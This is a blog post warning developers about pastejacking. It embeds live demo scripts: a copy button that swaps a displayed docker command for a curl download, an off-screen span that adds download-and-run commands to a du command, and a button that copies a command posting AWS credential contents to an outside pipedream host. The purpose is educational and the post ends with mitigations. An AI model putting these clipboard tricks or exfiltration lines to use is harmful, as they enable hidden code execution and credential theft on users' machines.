---
layout: post
emoji: 🗒️
asset: "/assets/posts/dont-trust-your-clipboard"
---

One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets.

At first glance, copying and pasting code from the internet appears innocuous and is a daily practice many of us. It's common to copy code from various online sources such as tutorials, Stack Overflow posts, READMEs, gists, blogs, and the like.

Just as hackers exploit our desensitization to opening emails and clicking on links, programmers can also become accustomed to the potential risks of copying and pasting code into their terminals, which can lead to much more severe consequences.

**DISCLAIMER:** This post highlights the importance of being cautious when copying and pasting text from the internet, and the content below is no exception. While I cannot prevent you from copying the code yourself, I urge you to proceed with caution, as there may be risks involved. Later on, we will delve into the reasons why I felt the need to include this disclaimer.

One of my favorite examples of why you should exercise caution when running copy and paste commands from websites is the git gist authored by `frankbi`.

<div style="text-align: center;">
    <img style="max-width: 75%;" src="{{ page.asset }}/rickrollbashcode.png">
    <br>
    <img style="max-width: 75%;" src="{{ page.asset }}/rickroll.gif"/>
</div>

Although the rickroll itself may seem harmless, the fact that it involves arbitrary code execution on your computer is something that should always make you uneasy. Unfortunately, many project installation instructions are now utilizing similar commands such as `curl -L https://example.com/script.sh | bash` or `bash -c $(curl 0fsSL https://example.com/script.sh). One prominent example of this is Homebrew.`

#### [Install Homebrew - brew.sh](https://brew.sh/)
<div style="text-align: center;">
    <img style="max-width: 85%;" src="{{ page.asset }}/copy_select_brew.png">
</div>

Arbitrary code execution is bad because it involves running code on your computer that you may not understand or trust. This can lead to serious security vulnerabilities or other consequences. With the understanding and concern associated with arbitrary code execution, let's examine the different methods of copying text, including copying via button and the traditional select, copy, and paste method.

## Copy Text Via Button

While the pervious example might seem obvious to many. What is less obvious is the copy button which purpose to save you the backbreaking task of highlighting and `ctrl + c` or `right click copy` the text itself. Below of some examples in the last month of where I have encountered the copy text button:

#### [Amazon EC2 key pairs | aws.amazon.com](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-key-pairs.html)

https://askubuntu.com/questions/377259/stop-terminal-auto-executing-when-pasting-a-command

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_docs_aws.png">
</div>

#### [pyenv/pyenv README| github.com](https://github.com/pyenv/pyenv)

Github injects a copy button for all code block in READMEs.

<div style="text-align: center;">
    <img style="max-width: 80%;" src="{{ page.asset }}/copy_button_github_readme.png">
</div>


The examples above are not inherently harmful, but they may lead individuals trust the copy button as a means of transferring commands from a website to a terminal. What's overlooked is that you are at the mercy of the website's code. Let's consider a scenario where we visit a blog post written by someone with malicious intent.

<link rel="stylesheet" href="{{ page.asset }}/totallysafeandhelpful.css">

<div id="totallysafeandhelpful">
  <h3>Welcome to totally-safe-and-helpful.blog</h3>
  <h5>By BadActor666</h5>
  <p>Today we are going to give you a couple of useful docker commands. Lets jump right into it! You can copy all the commands into your terminal using the handy copy button!</p>
  <div>Remove all images</div>
  <table>
    <td style="vertical-align: middle; width: 100%">
      <div class="code nocopy">docker rmi $(docker images -a -q)</div>
    </td>
    <td style="vertical-align: middle;">
      <div class="code1">
        <button class="button" onclick="nefariousCopy()"><span>📋</span></button>
      </div>
      </td>
  </table>
    <br>
</div>

<script>
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io/{{ page.asset }}/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
</script>

Oh `BadActor666` provides the Docker command I am looking for and I can easily copy & paste it into my terminal via the copy button.

<div style="text-align: center;">
<video style="max-width: 80%;"  controls>
  <source src="{{ page.asset }}/ghostbusters.mp4" type="video/mp4">
  Your browser does not support HTML video.
</video>
</div>


You just got ghostbusted!

The copy button called a javascript function.
```
<button class="button" onclick="nefariousCopy()"><span>📋</span></button>
```

The nefariousCopy function creates a dummy text element and selects its' contents. Using [`execCommand(copy)`](https://developer.mozilla.org/en-US/docs/Mozilla/Add-ons/WebExtensions/Interact_with_the_clipboard) the dummy text is copied to the clipboard and the user is none the wiser.
```
function nefariousCopy(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  dummy.textContent = `curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n`;
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
```

This is what is copied to the clipboard when the copy button is clicked:
```
curl -L https://nickstanley574.github.io{{ page.asset }}/ghostbusters \n
```

Using `select()` plus `execCommand()` is the way most copy buttons on webpage work, just instead of adding a dummy element and text behind seen They select and copy the text from elements seen by the user, but the user is at the mercy of the copy function.

## Select, Copy & Paste

One of the best things about the software profession is culture of knowledge sharing. You can find a solutions, manuals, tutorials, and blogs all over the internet which examples, commands and code snippets. Simply selecting text, using right click or `ctrl + c` and then pasting should be safe right? 

Lets go back to Look at another post from  totally-safe-and-helpful.blog ...

<div id="totallysafeandhelpful">

  <h3>Welcome back to totally-safe-and-helpful.blog</h3>
  <h5>By BadActor666</h5>

  Today we are going to explore how to find the files taking up all your harddisk space using the `du` command.

  <br><br>
  <div class="code">du -hs *<span style="position: absolute; top: -200px; left: -200px;">; curl -s -L https://nickstanley574.github.io/{{ page.asset }}/sl --output sl; chmod +x sl; ./sl; clear;<br>du -hs * </span> | sort -rh | head -5</div>
  <br>
</div>

... seems safe enough. Looks like any other code snippet from any of the following websites and blogs. You can see where this is going. All aboard 🚂 !

<div style="text-align: center;">
<video style="max-width: 80%;"  controls>
  <source src="{{ page.asset }}/choochoo.mp4" type="video/mp4">
  Your browser does not support HTML video.
</video>
</div>

```
<div class="code">
  du -hs *
  <span style="position: absolute; top: -200px; left: -200px;">
  "; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;"
  <br>
  du -hs *
  </span>
  | sort -rh | head -5
</div>
```

This time `BadActor666` used a `<span>` tag inside of a `<div>`. A `<span>` tag is a inline container similar to `<b>` and `<i>`. It is used to apply styles to text. For example:

<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>

```
<p>Don't <b>ever</b> push the <b><span style="color:red">red</span> one</b>.</p>
```

This allows us to add style to text, but browser allows the copy without the the format applied. The BadActor666 `<span>` contains the styling of `position: absolute; top: -200px; left: -200px;` which puts the text off screen in the upper left conner of the browser window. Even though you can't see it doesn't mean its not copied. When the `du` command is highlighted so is the text in the `<span>`. Here is what is copied to your clipboard.
```
du -hs *; curl -s -L https://nickstanley574.github.io//assets/posts/dont-trust-your-clipboard/sl --output sl; chmod +x sl; ./sl; clear;
du -hs * | sort -rh | head -5
```

The curl downloads a file, makes it exactable, runs it.

## Composing the Attack

### Attack Avenue 1

Now the real danger is in the `sudo` command. The `sudo` command gives a user temporarily elevated privileges allowing the completion of tasks that require to be run as the root user.  Often sudo is used to install or update packages, i.e. `sudo apt-get install apache2` on.

```
nick ~
$ sudo apt-get install apache2
[sudo] password for nick:
```

When sudo is run the user is asked to enter their password to allow the action. Sudo then will check if the user has the need permissions to run the command if not the command will get denied. For example lets install `apache` and `nginx`.

```
nick /home $ sudo apt-get install apache2
[sudo] password for nick:
Reading package lists... Done
...
nick /home $ sudo apt-get install nginx
Reading package lists... Done
...
nick /home $
```

Notice how for the second sudo command didn't require a password. Thats because sudo has a setting entitled, `timestamp_timeout` sets the number of minutes that can elapse before sudo will ask for a passwd again. This allow to run multiple sudo command in short pervious of time without needing to re-enter your password over and over again. By default is value is set to 5 minutes. This is where hackers can take advantage. First, have a commands that are legit that require `sudo` access.

```
sudo apt install -yq curl gnupg2 ca-certificates lsb-release
sudo apt-get -yq update
sudo apt install -yq nginx
sudo systemctl start nginx
```

This could result in malicious or spyware or ransomware being installed on a system.

### Attack Avenue 2

Wh

#
<!-- curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null; top; exit-->

Your user can access your data your don't need sudo/root.

<div id="totallysafeandhelpful">
  <h3>Welcome to totally-safe-and-helpful.blog</h3>
  <h5>By BadActor666</h5>
  <table>
    <td style="vertical-align: middle; width: 100%">
      <div class="code nocopy">top -d 0.25 -c</div>
    </td>
    <td style="vertical-align: middle;">
      <div class="code1">
        <button id=b2 class="button2" onclick="nefariousCopy2()"><span>📋</span></button>
      </div>
      </td>
  </table>
    <br>
</div>

<script>
var clicks = 0;
function nefariousCopy2(n) {
  var dummy = document.createElement("textarea");
  document.body.appendChild(dummy);
  console.log(clicks)
  if (clicks == 0) {
    document.getElementById("b2").classList.toggle("button2");
    dummy.textContent = `xclip -sel clip < /dev/null & curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null & clear; top -d 0.25 -c & clear; kill -9 $$ \n`;
  } else {
    dummy.textContent = `top -d 0.25 -c \n`;
  }
  clicks++
  dummy.select();
  document.execCommand("copy");
  document.body.removeChild(dummy);
}
</script>

```
xclip -sel clip < /dev/null & curl -s -d "$(cat ~/.aws/credentials_fake)" https://en2lx5n7b4y69.x.pipedream.net/ > /dev/null & clear; top -d 0.25 -c & clear; kill -9 $$ 
```

## Conclusion  

When you use someone else's code or access a website, you are placing trust in them to ensure the security of their code and prevent unauthorized modifications. This is why I added the disclaimer. Do you know how strong my password is for my github? Do you know if I have MFA setup for my account? Do you know if I have given someone else access to the repo? 

Another option is to prevent critical systems from having any type of access to the internet. Instead, make sure nothing can reach the internet and have dependencies, package repose and other resources be in some type of artifacts store. This way even if something malicious is copied there is no way to download from or upload to the internet. 

Where do we go from here? To not copy from the internet would be crazy, but to mitigate the risk, I do not directly copy and paste text into the terminal. Instead, I paste the text into a plaintext editor, review the command, and then paste or rewrite it into the terminal. It takes a bit longer, but when working on systems that have access to either my personal or client data, the extra time is worth the added security.

